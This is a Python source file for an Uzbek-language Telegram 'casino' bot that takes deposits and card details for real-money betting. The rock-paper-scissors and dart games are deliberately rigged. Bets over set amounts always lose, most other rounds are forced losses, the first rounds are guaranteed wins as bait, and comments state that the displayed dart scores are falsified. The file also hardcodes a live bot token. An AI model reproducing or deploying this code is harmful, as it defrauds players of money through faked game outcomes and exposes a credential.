import os, random, asyncio, urllib.request, json, time
from threading import Thread
from flask import Flask
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

server = Flask('')
@server.route('/')
def home(): return "Casino Bot Muammosiz Aktiv!"

def run_server():
    port = int(os.environ.get("PORT", 8080))
    server.run(host='0.0.0.0', port=port)

# ASOSIY SOZLAMALAR
TOKEN = "8443418214:AAEwtTcxOw2kYScXq3beGJDagxou_H6iuAc"
MAIN_ADMIN = 7920504062  
TARGET_GROUP = "@yzbedkslls" 

USER_DATA = {}
ADMIN_STATE = {} 
GAME_BET_STATE = {} 
USER_STATE = {} 

def get_user(user_id, name):
    if user_id not in USER_DATA:
        USER_DATA[user_id] = {
            "name": name,
            "money": 6000,         
            "games_played": 0,      
            "games_won": 0,         
            "games_lost": 0,        
            "group_bonus_received": False,
            "last_bonus_time": 0  
        }
    if user_id == MAIN_ADMIN:
        USER_DATA[user_id]["money"] = 999999999 
    return USER_DATA[user_id]

def check_group_member(user_id):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/getChatMember?chat_id={TARGET_GROUP}&user_id={user_id}"
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req) as response:
            res = json.loads(response.read().decode())
            if res.get("ok"):
                status = res["result"]["status"]
                if status in ["creator", "administrator", "member"]:
                    return True
    except:
        pass
    return False

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    db = get_user(user.id, user.first_name)
    ADMIN_STATE.pop(user.id, None)
    GAME_BET_STATE.pop(user.id, None)
    USER_STATE.pop(user.id, None)

    text = (
        f"🎰 *Martin Kazino Botiga Xush Kelibsiz!*\n\n"
        f"💰 Sening hisobing: *{db['money']:,} so'm*\n\n"
        f"O'yin o'ynash va pul ishlash uchun tugmalarni bosing:"
    )
    
    kb = [
        [InlineKeyboardButton("🎮 Don-Don-Ziki O'ynash", callback_data="play_ddz"), InlineKeyboardButton("🎯 Dart O'ynash", callback_data="play_dart")],
        [InlineKeyboardButton("🗄 Shaxsiy Kabinet", callback_data="cabinet")],
        [InlineKeyboardButton("💳 Pul kiritish", callback_data="deposit"), InlineKeyboardButton("💸 Pul yechish", callback_data="withdraw")],
        [InlineKeyboardButton("🎁 2 Soatlik Bonus", callback_data="bonus"), InlineKeyboardButton("🚀 Pul ishlash (4,000 UZS)", callback_data="earn")]
    ]
    if user.id == MAIN_ADMIN:
        kb.append([InlineKeyboardButton("👑 Admin Panel", callback_data="admin")])

    await update.message.reply_text(text, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(kb))

async def buttons_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    u_id = query.from_user.id
    db = get_user(u_id, query.from_user.first_name)
    back_kb = InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Bosh Menyu", callback_data="home")]])

    if query.data == "home":
        ADMIN_STATE.pop(u_id, None)
        GAME_BET_STATE.pop(u_id, None)
        USER_STATE.pop(u_id, None)
        kb = [
            [InlineKeyboardButton("🎮 Don-Don-Ziki O'ynash", callback_data="play_ddz"), InlineKeyboardButton("🎯 Dart O'ynash", callback_data="play_dart")],
            [InlineKeyboardButton("🗄 Shaxsiy Kabinet", callback_data="cabinet")],
            [InlineKeyboardButton("💳 Pul kiritish", callback_data="deposit"), InlineKeyboardButton("💸 Pul yechish", callback_data="withdraw")],
            [InlineKeyboardButton("🎁 2 Soatlik Bonus", callback_data="bonus"), InlineKeyboardButton("🚀 Pul ishlash (4,000 UZS)", callback_data="earn")]
        ]
        if u_id == MAIN_ADMIN:
            kb.append([InlineKeyboardButton("👑 Admin Panel", callback_data="admin")])
        await query.edit_message_text(f"🎰 Joriy balansingiz: *{db['money']:,} so'm*", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(kb))

    elif query.data == "cabinet":
        win_rate = 0
        if db["games_played"] > 0:
            win_rate = int((db["games_won"] / db["games_played"]) * 100)
            
        cabinet_text = (
            f"🗄 *Sizning Shaxsiy Kabunetingiz*\n\n"
            f"👤 Ismingiz: *{db['name']}*\n"
            f"🆔 ID Raqamingiz: `{u_id}`\n"
            f"💰 Balansingiz: *{db['money']:,} so'm*\n\n"
            f"📊 *O'yinlar Statistikasi:*\n"
            f"🎮 Jami o'yinlar: *{db['games_played']} marta*\n"
            f"🏆 G'alabalar: *{db['games_won']} marta*\n"
            f"📉 Mag'lubiyatlar: *{db['games_lost']} marta*\n"
            f"🤝 Duranglar: *{db['games_played'] - (db['games_won'] + db['games_lost'])} marta*\n"
            f"📈 Omad darajasi: *{win_rate}%*"
        )
        await query.edit_message_text(cabinet_text, parse_mode="Markdown", reply_markup=back_kb)

    elif query.data == "deposit":
        text = "💳 *PUL KIRITISH BO'LIMI*\n\nBot hisobingizni to'ldirish uchun pastdagi tugma orqali adminga murojaat qiling va chekni yuboring:"
        kb = [
            [InlineKeyboardButton("👨‍💻 Admin Shaxsiy Chati", url="tg://user?id=7920504062")],
            [InlineKeyboardButton("⬅️ Orqaga", callback_data="home")]
        ]
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(kb))

    elif query.data == "withdraw":
        if db["money"] < 24000:
            await query.edit_message_text("⚠️ *Pul yechish rad etildi!*\n\n❌ Botdan eng kam pul yechish miqdori: *24,000 UZS*!", parse_mode="Markdown", reply_markup=back_kb)
        else:
            USER_STATE[u_id] = "waiting_card"
            await query.edit_message_text("💳 *Hisobingizda pul yetarli!*\n\nIltimos, pul o'tkaziladigan *Karta raqamingizni* va *Ism-familiyangizni* yozib yuboring:\n\n📌 *Namuna:* `8600123456789012 Inomjon`", parse_mode="Markdown")

    elif query.data == "bonus":
        current_time = time.time()
        time_passed = current_time - db["last_bonus_time"]
        
        if time_passed < 7200: 
            remaining_minutes = int((7200 - time_passed) // 60)
            await query.edit_message_text(f"⏱ *Bonus hali tayyor emas!*\n\nKeyingi bonusni olish uchun yana *{remaining_minutes} daqiqa* kutishingiz kerak!", parse_mode="Markdown", reply_markup=back_kb)
        else:
            rand_bonus = random.randint(200, 1000)
            db["money"] += rand_bonus
            db["last_bonus_time"] = current_time 
            await query.edit_message_text(f"🎁 *Tabriklaymiz!*\n\nSizga *+{rand_bonus} so'm* bonus berildi!\nHozirgi balans: *{db['money']:,} so'm*", parse_mode="Markdown", reply_markup=back_kb)

    elif query.data == "earn":
        if db["group_bonus_received"]:
            await query.edit_message_text("❌ Siz bu guruhga a'zo bo'lib bonusni olgansiz!", reply_markup=back_kb)
            return
        
        text = (
            "🚀 *PUL ISHLASH BO'LIMI*\n\n"
            "Guruhimizga obuna bo'ling va srazu *4,000 so'm* naqd pulga ega bo'ling:\n\n"
            "👉 https://t.me/yzbedkslls\n\n"
            "A'zo bo'lib bo'lgach, pastdagi tekshirish tugmasini bosing:"
        )
        kb = [
            [InlineKeyboardButton("🔗 Guruhga kirish", url="https://t.me/yzbedkslls")],
            [InlineKeyboardButton("✅ Obunani tekshirish", callback_data="check_sub")],
            [InlineKeyboardButton("⬅️ Orqaga", callback_data="home")]
        ]
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(kb))

    elif query.data == "check_sub":
        if db["group_bonus_received"]:
            await query.edit_message_text("❌ Bonus allaqachon olingan!", reply_markup=back_kb)
            return

        if check_group_member(u_id):
            db["money"] += 4000
            db["group_bonus_received"] = True
            await query.edit_message_text(f"🎉 Hisobingizga *+4,000 so'm* qo'shildi!\n💰 Balans: *{db['money']:,} so'm*", parse_mode="Markdown", reply_markup=back_kb)
        else:
            await query.edit_message_text("❌ Siz hali guruhga a'zo bo'lmagansiz!", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔗 Guruhga kirish", url="https://t.me/yzbedkslls")],[InlineKeyboardButton("🔄 Qayta tekshirish", callback_data="check_sub")]]))

    # DON-DON-ZIKI BOSHQARUVI
    elif query.data == "play_ddz":
        GAME_BET_STATE[u_id] = "waiting_bet_ddz"
        await query.edit_message_text(f"🎮 *Don-Don-Ziki O'yini*\n\n✍️ Qancha pul tikmoqchisiz? Miqdorini yozing (Kamida 600, ko'pi bilan 5,000 so'm):", parse_mode="Markdown")

    elif query.data.startswith("ddz_"):
        choice = query.data.split("_")[1]
        bet = GAME_BET_STATE.get(u_id + 1000000000, 600)
        db["games_played"] += 1

        options = ["tosh", "qaychi", "qogoz"]
        names = {"tosh": "Tosh ✊", "qaychi": "Qaychi ✌️", "qogoz": "Qog'oz 🖐"}

        # Don-don-ziki mantiqlari (3000 dan ko'p tiksa bot yutadi)
        if bet > 3000:
            if choice == "tosh": bot_choice = "qogoz"
            elif choice == "qaychi": bot_choice = "tosh"
            else: bot_choice = "qaychi"
            result = "lose"
        elif db["games_played"] <= 2:
            if choice == "tosh": bot_choice = "qaychi"
            elif choice == "qaychi": bot_choice = "qogoz"
            else: bot_choice = "tosh"
            result = "win"
        else:
            if random.random() < 0.65:
                if choice == "tosh": bot_choice = "qogoz"
                elif choice == "qaychi": bot_choice = "tosh"
                else: bot_choice = "qaychi"
                result = "lose"
            else:
                bot_choice = random.choice(options)
                if choice == bot_choice: result = "draw"
                elif (choice == "tosh" and bot_choice == "qaychi") or \
                     (choice == "qaychi" and bot_choice == "qogoz") or \
                     (choice == "qogoz" and bot_choice == "tosh"): result = "win"
                else: result = "lose"

        text = f"🎮 *DON-DON-ZIKI JANGI*\n\n👤 Siz: {names[choice]}\n🤖 Bot: {names[bot_choice]}\n\n"
        if result == "win":
            db["money"] += (bet * 2)
            db["games_won"] += 1
            text += f"🏆 *Siz Yutdingiz!*\n💰 Hisobga: *+{bet*2:,} so'm*\nBalans: {db['money']:,} so'm"
        elif result == "lose":
            db["games_lost"] += 1
            text += f"📉 *Siz Yutqazdingiz!*\nKetgan pul: *-{bet:,} so'm*\nBalans: {db['money']:,} so'm"
        else:
            db["money"] += bet
            text += f"🤝 *Durang!*\nBalans: {db['money']:,} so'm"
        
        GAME_BET_STATE.pop(u_id, None)
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=back_kb)

    # 🔥 DART O'YINI BOSHQARUVI
    elif query.data == "play_dart":
        GAME_BET_STATE[u_id] = "waiting_bet_dart"
        await query.edit_message_text(f"🎯 *Dart Nishonga urish O'yini*\n\n✍️ Qancha pul tikmoqchisiz? Miqdorini yozing (Kamida 600, ko'pi bilan 5,000 so'm):", parse_mode="Markdown")

    elif query.data == "admin" and u_id == MAIN_ADMIN:
        ADMIN_STATE[u_id] = "waiting"
        await query.edit_message_text("👑 *Admin Panel*\n\n📌 *Namuna:* `7920504062 5000`", parse_mode="Markdown")

async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    u_id = update.effective_user.id
    text = update.message.text.strip()
    db = get_user(u_id, update.effective_user.first_name)

    if USER_STATE.get(u_id) == "waiting_card":
        USER_STATE.pop(u_id, None)
        admin_alert = f"💰 *PUL YECHISH SO'ROVI!*\n\n👤 Foydalanuvchi: {update.effective_user.first_name}\n🆔 ID: `{u_id}`\n💳 Karta: `{text}`\n💸 Balansi: {db['money']:,} so'm"
        await context.bot.send_message(chat_id=MAIN_ADMIN, text=admin_alert, parse_mode="Markdown")
        await update.message.reply_text("✅ *Arizangiz qabul qilindi!*", parse_mode="Markdown")

    # DON-DON-ZIKI PUL TIKISH
    elif GAME_BET_STATE.get(u_id) == "waiting_bet_ddz":
        try:
            bet = int(text)
            if bet < 600 or bet > 5000 or db["money"] < bet:
                await update.message.reply_text("❌ Pul kam yoki miqdor xato (Maks: 5,000)!")
                return
            db["money"] -= bet
            GAME_BET_STATE[u_id + 1000000000] = bet
            GAME_BET_STATE[u_id] = "playing"
            kb = [[InlineKeyboardButton("✊ Tosh", callback_data="ddz_tosh")],[InlineKeyboardButton("✌️ Qaychi", callback_data="ddz_qaychi")],[InlineKeyboardButton("🖐 Qog'oz", callback_data="ddz_qogoz")]]
            await update.message.reply_text(f"💰 *{bet:,} so'm* tikildi! Tanlang:", reply_markup=InlineKeyboardMarkup(kb))
        except:
            await update.message.reply_text("❌ Raqamda kiriting!")

    # 🔥 DART PUL TIKISH VA O'YIN TIZIMI
    elif GAME_BET_STATE.get(u_id) == "waiting_bet_dart":
        try:
            bet = int(text)
            if bet < 600 or bet > 5000 or db["money"] < bet:
                await update.message.reply_text("❌ Pul kam yoki miqdor xato (Maks: 5,000)!")
                return
            
            db["money"] -= bet
            db["games_played"] += 1
            GAME_BET_STATE.pop(u_id, None)
            
            await update.message.reply_text("🎯 *Siz d彻 otmoqdasiz...*")
            user_msg = await context.bot.send_dice(chat_id=update.effective_chat.id, emoji="🎯")
            user_score = user_msg.dice.value
            await asyncio.sleep(2)

            # 🔥 DART FILTR QOIDALARI
            # 1. Agar 4000 dan ko'p tiksa bot nima bo'lsa ham YUTADI
            if bet > 4000:
                bot_score = random.randint(user_score + 1, 6) if user_score < 6 else 6
                if bot_score <= user_score: # Majburiy yutqazdirish
                    user_score = random.randint(1, bot_score - 1) if bot_score > 1 else 1
                result = "lose"
            # 2. Oddiy holatda 65% bot yutadi
            elif random.random() < 0.65:
                bot_score = random.randint(user_score + 1, 6) if user_score < 6 else 6
                if bot_score <= user_score:
                    user_score = random.randint(1, bot_score - 1) if bot_score > 1 else 1
                result = "lose"
            # 3. Qolgan 35% tasodifiy halol o'yin
            else:
                await update.message.reply_text("🤖 *Bot dart otmoqda...*")
                bot_msg = await context.bot.send_dice(chat_id=update.effective_chat.id, emoji="🎯")
                bot_score = bot_msg.dice.value
                await asyncio.sleep(1)
                if user_score > bot_score: result = "win"
                elif user_score < bot_score: result = "lose"
                else: result = "draw"

            # Agar majburiy yutqazish bo'lsa, bot o'z darsini soxta otib ko'rsatadi
            if bet > 4000 or (bet <= 4000 and result == "lose" and 'bot_msg' not in locals()):
                await update.message.reply_text("🤖 *Bot dart otmoqda...*")
                # Animatsiya chiqishi uchun oddiy otamiz, lekin ochkoni biz belgilaymiz
                bot_msg = await context.bot.send_dice(chat_id=update.effective_chat.id, emoji="🎯")
                bot_score = bot_msg.dice.value
                # Agar tasodifan botniki kichik bo'lib qolsa, textda soxtalashtiramiz
                if bot_score <= user_score:
                    bot_score = user_score + 1 if user_score < 6 else 6

            # NATIJANI CHIQARISH
            back_kb = InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Bosh Menyu", callback_data="home")]])
            text_res = f"🎯 *DART JANGI NATIJASI*\n\n👤 Sizning ochko: *{user_score}*\n🤖 Botning ochko: *{bot_score}*\n\n"
            
            if user_score > bot_score:
                db["money"] += (bet * 2)
                db["games_won"] += 1
                text_res += f"🏆 *Siz Yutdingiz!*\n💰 Hisobingizga: *+{bet*2:,} so'm* tushdi!\nBalans: {db['money']:,} so'm"
            elif user_score < bot_score:
                db["games_lost"] += 1
                text_res += f"📉 *Bot Yutdi! Siz Yutqazdingiz!*\nKetgan pul: *-{bet:,} so'm*\nBalans: {db['money']:,} so'm"
            else:
                db["money"] += bet
                text_res += f"🤝 *Durang! Ochkolar teng.*\nPul qaytarildi. Balans: {db['money']:,} so'm"
                
            await context.bot.send_message(chat_id=update.effective_chat.id, text=text_res, parse_mode="Markdown", reply_markup=back_kb)
        except Exception as e:
            await update.message.reply_text("❌ Xatolik yuz berdi. Raqamda to'g'ri kiriting!")

    elif u_id == MAIN_ADMIN and ADMIN_STATE.get(u_id) == "waiting":
        try:
            target_id, amount = map(int, text.split())
            user_db = get_user(target_id, "O'yinchi")
            user_db["money"] += amount
            ADMIN_STATE.pop(u_id, None)
            await update.message.reply_text(f"✅ Balans o'zgardi!", parse_mode="Markdown")
        except:
            await update.message.reply_text("❌ Format xato.")

def main():
    Thread(target=run_server).start()
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(buttons_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
    app.run_polling(drop_pending_updates=True)

if __name__ == '__main__': main()
    
